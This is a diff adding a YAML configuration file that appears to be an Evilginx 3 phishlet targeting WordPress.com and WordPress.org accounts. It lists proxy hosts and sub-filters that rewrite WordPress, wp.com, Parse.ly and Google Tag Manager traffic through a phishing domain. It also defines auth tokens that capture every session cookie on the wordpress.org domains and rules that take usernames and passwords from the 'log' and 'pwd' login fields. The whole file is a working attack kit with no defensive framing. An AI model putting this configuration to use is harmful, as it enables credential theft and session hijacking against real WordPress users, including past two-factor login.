@@ -1,0 +1,60 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'wordpress.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'wordpress.org', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 's1', orig_sub: 's1', domain: 'wp.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'stats', orig_sub: 'stats', domain: 'wp.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'wpcom.files', orig_sub: 'wpcom.files', domain: 'wordpress.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'pixel', orig_sub: 'pixel', domain: 'wp.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 's0', orig_sub: 's0', domain: 'wp.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'public-api', orig_sub: 'public-api', domain: 'wordpress.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'parsely.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'refer', orig_sub: 'refer', domain: 'wordpress.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'profiles', orig_sub: 'profiles', domain: 'wordpress.org', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'wordpress.com', orig_sub: '', domain: 'wordpress.com', search: 'https://{hostname}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'login.wordpress.com', orig_sub: 'login', domain: 'wordpress.org', search: 'https://{hostname}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 's1.wp.com', orig_sub: 's1', domain: 'wp.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'stats.wp.com', orig_sub: 'stats', domain: 'wp.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'wpcom.files.wordpress.com', orig_sub: 'wpcom.files', domain: 'wordpress.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'pixel.wp.com', orig_sub: 'pixel', domain: 'wp.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}  
+  - {triggers_on: 's0.wp.com', orig_sub: 's0', domain: 'wp.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'public-api.wordpress.com', orig_sub: 'public-api', domain: 'wordpress.com', search: 'https://{hostname_regexp}/', replace: 'https%3A%2F%2Fhttps://{hostname}:443', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'wordpress.com', orig_sub: 'public-api', domain: 'wordpress.com', search: '/rest/v1.1/users/', replace: 'https%3A%2F%2Fhttps://{hostname}:443', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'cdn.parsely.com', orig_sub: 'cdn', domain: 'parsely.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'refer.wordpress.com', orig_sub: 'refer', domain: 'wordpress.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'www.googletagmanager.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+
+auth_tokens:
+  - domain: 'profiles.wordpress.org'
+    keys: ['.*,regexp']    
+    type: 'cookie'
+  - domain: 'login.wordpress.org'
+    keys: ['.*,regexp']    
+    type: 'cookie'  
+  - domain: '.wordpress.org'
+    keys: ['.*,regexp']    
+    type: 'cookie'   
+
+credentials:
+  username:  
+    key: 'log'
+    search: '(.*)'    
+    type: 'post' 
+  password:
+    key: 'pwd'
+    search: '(.*)'    
+    type: 'post' 
+
+auth_urls:
+  - '/user/'
+  - '/'
+
+login:
+  domain: 'login.wordpress.org'
+  path: '/wp-login.php'
+
